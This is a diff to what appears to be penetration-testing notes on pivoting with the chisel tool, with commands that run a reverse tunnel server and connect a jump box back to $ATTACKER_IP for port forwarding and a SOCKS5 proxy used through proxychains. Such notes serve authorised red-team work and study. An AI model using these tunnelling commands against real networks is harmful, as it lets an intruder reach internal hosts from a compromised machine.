@@ -33,10 +33,10 @@ chisel server --port 8000 --reverse
 from jump box
 
 ```shell
-./chisel client $ATTACKER_IP:8000 R:5985:$DEST_IP:5985
+./chisel client $ATTACKER_IP:8000 R:$PORT:$DEST_IP:$PORT
 ```
 
- working socks5 server on $ATTACKER_IP port 1080
+ Opening socks5 server on LOCAL machine on port 1080
 
 ```shell
 chisel server --port 8001 --socks5 --reverse
@@ -48,7 +48,7 @@ on jump box
 ./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks
 ```
 
-Edit proxychains config:
+Then edit proxychains config:
   
 ```config
 socks5 127.0.0.1 1080
